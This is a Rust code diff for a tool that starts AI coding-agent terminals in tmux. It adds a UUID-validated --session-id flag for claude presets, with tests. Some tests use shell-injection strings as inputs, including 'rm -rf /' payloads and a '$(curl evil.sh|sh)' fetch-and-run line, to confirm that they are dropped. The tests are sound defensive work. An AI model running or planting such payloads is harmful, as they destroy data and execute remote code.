@@ -33,7 +33,12 @@ use crate::{git, paths};
 ///
 /// The model is validated before it reaches a shell. It is the only part of
 /// this that a client supplies freely, and it ends up inside a `-ilc` string.
-pub fn preset_command(preset: &str) -> String {
+///
+/// `session_id`, when given to a `claude` preset, is declared to the process
+/// with `--session-id` rather than left to be discovered later from whichever
+/// `.jsonl` file under `~/.claude/projects` turns out to be newest. Only
+/// `claude` understands the flag, so every other preset ignores it.
+pub fn preset_command(preset: &str, session_id: Option<&str>) -> String {
     let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
     let (agent, model) = match preset.split_once(':') {
         Some((a, m)) if is_safe_model(m) => (a, Some(m)),
@@ -45,9 +50,18 @@ pub fn preset_command(preset: &str) -> String {
     };
 
     let flag = model.map(|m| format!(" --model {m}")).unwrap_or_default();
+
+    // Declared, not discovered — but it still ends up inside a `-ilc` string,
+    // so anything that is not a plain uuid is dropped rather than escaped. The
+    // cost of dropping it is one adoption that has to fall back to searching.
+    let session = session_id
+        .filter(|s| Uuid::parse_str(s).is_ok())
+        .map(|s| format!(" --session-id {s}"))
+        .unwrap_or_default();
+
     match agent {
         "shell" => format!("{shell} -il"),
-        "claude" => format!("{shell} -ilc 'claude{flag}'"),
+        "claude" => format!("{shell} -ilc 'claude{flag}{session}'"),
         "codex" => format!("{shell} -ilc 'codex{flag}'"),
         "cursor" => format!("{shell} -ilc 'cursor-agent{flag}'"),
         other if is_safe_model(other) => format!("{shell} -ilc '{other}{flag}'"),
@@ -580,8 +594,22 @@ impl Service {
             40,
         )?;
 
+        // A claude terminal gets its session id now, so that adopting it into
+        // agent pane mode later is exact.
+        let declared = command_preset.starts_with("claude").then(|| Uuid::now_v7().to_string());
+        let term = if let Some(ref sid) = declared {
+            self.store.set_pane_mode(
+                term.id,
+                term.resource_version,
+                models::PaneMode::Terminal,
+                Some(sid.clone()),
+            )?
+        } else {
+            term
+        };
+
         // 2. Create and tag the window.
-        let command = preset_command(command_preset);
+        let command = preset_command(command_preset, declared.as_deref());
         let created = self
             .tmux
             .create_terminal_window(workspace_id, term.id, title, &ws.worktree_path, &command)
@@ -680,7 +708,7 @@ impl Service {
             40,
         )?;
 
-        let command = preset_command(command_preset);
+        let command = preset_command(command_preset, term.agent_session_id.as_deref());
         let created = self
             .tmux
             .split_pane(&pane.pane_id, axis, term.id, &ws.worktree_path, &command, before)
@@ -760,7 +788,9 @@ impl Service {
 
         let _ = self.tmux.kill_terminal_window(id).await;
 
-        let command = preset_command(&term.command_preset);
+        // A restarted claude reattaches to the conversation it already had
+        // rather than starting a new one the record does not know about.
+        let command = preset_command(&term.command_preset, term.agent_session_id.as_deref());
         self.tmux
             .create_terminal_window(term.workspace_id, id, &term.title, &ws.worktree_path, &command)
             .await?;
@@ -980,9 +1010,9 @@ mod tests {
         // Startup files, version managers, direnv and aliases must behave like a
         // hand-launched terminal.
         // Quoted now, because a preset may carry a model.
-        assert!(preset_command("claude").contains("-ilc 'claude'"));
-        assert!(preset_command("shell").ends_with("-il"));
-        assert!(preset_command("cursor").contains("cursor-agent"));
+        assert!(preset_command("claude", None).contains("-ilc 'claude'"));
+        assert!(preset_command("shell", None).ends_with("-il"));
+        assert!(preset_command("cursor", None).contains("cursor-agent"));
     }
 
     #[test]
@@ -1024,30 +1054,30 @@ mod preset_tests {
 
     #[test]
     fn a_bare_preset_runs_the_agent() {
-        assert!(preset_command("claude").contains("'claude'"));
-        assert!(preset_command("codex").contains("'codex'"));
-        assert!(preset_command("cursor").contains("'cursor-agent'"));
-        assert!(preset_command("shell").ends_with("-il"));
+        assert!(preset_command("claude", None).contains("'claude'"));
+        assert!(preset_command("codex", None).contains("'codex'"));
+        assert!(preset_command("cursor", None).contains("'cursor-agent'"));
+        assert!(preset_command("shell", None).ends_with("-il"));
     }
 
     #[test]
     fn a_model_is_passed_through() {
-        assert!(preset_command("claude:opus").contains("claude --model opus"));
-        assert!(preset_command("codex:gpt-5.6-sol").contains("codex --model gpt-5.6-sol"));
+        assert!(preset_command("claude:opus", None).contains("claude --model opus"));
+        assert!(preset_command("codex:gpt-5.6-sol", None).contains("codex --model gpt-5.6-sol"));
     }
 
     #[test]
     fn a_model_that_is_not_an_identifier_is_dropped_not_escaped() {
         // This string reaches a `-ilc` argument. Dropping it loses nothing real
         // and leaves no argument about quoting.
-        let out = preset_command("claude:opus'; rm -rf /; '");
+        let out = preset_command("claude:opus'; rm -rf /; '", None);
         assert!(!out.contains("rm -rf"));
         assert!(out.contains("'claude'"));
     }
 
     #[test]
     fn an_unrecognised_preset_that_is_not_an_identifier_runs_nothing() {
-        let out = preset_command("$(curl evil.sh|sh)");
+        let out = preset_command("$(curl evil.sh|sh)", None);
         assert!(!out.contains("curl"));
         assert!(out.ends_with("-il"), "falls back to a plain shell");
     }
@@ -1055,8 +1085,31 @@ mod preset_tests {
     #[test]
     fn a_custom_agent_name_still_works() {
         // Presets are not a closed set: someone's own wrapper should run.
-        assert!(preset_command("aider").contains("'aider'"));
-        assert!(preset_command("aider:sonnet").contains("aider --model sonnet"));
+        assert!(preset_command("aider", None).contains("'aider'"));
+        assert!(preset_command("aider:sonnet", None).contains("aider --model sonnet"));
+    }
+
+    #[test]
+    fn a_claude_terminal_is_launched_with_the_session_id_we_chose() {
+        // So that switching this pane to agent mode later is a lookup rather
+        // than a guess about which of several .jsonl files is ours.
+        let cmd = preset_command("claude", Some("018f5b2c-0000-7000-8000-000000000000"));
+        assert!(cmd.contains("--session-id 018f5b2c-0000-7000-8000-000000000000"), "{cmd}");
+    }
+
+    #[test]
+    fn a_shell_is_not_given_a_session_id() {
+        let cmd = preset_command("shell", Some("018f5b2c-0000-7000-8000-000000000000"));
+        assert!(!cmd.contains("--session-id"), "{cmd}");
+    }
+
+    #[test]
+    fn a_session_id_that_is_not_a_uuid_is_dropped_rather_than_escaped() {
+        // It ends up inside a `-ilc` string. The existing rule for models
+        // applies here for the same reason.
+        let cmd = preset_command("claude", Some("; rm -rf /"));
+        assert!(!cmd.contains("rm -rf"), "{cmd}");
+        assert!(!cmd.contains("--session-id"), "{cmd}");
     }
 }
 
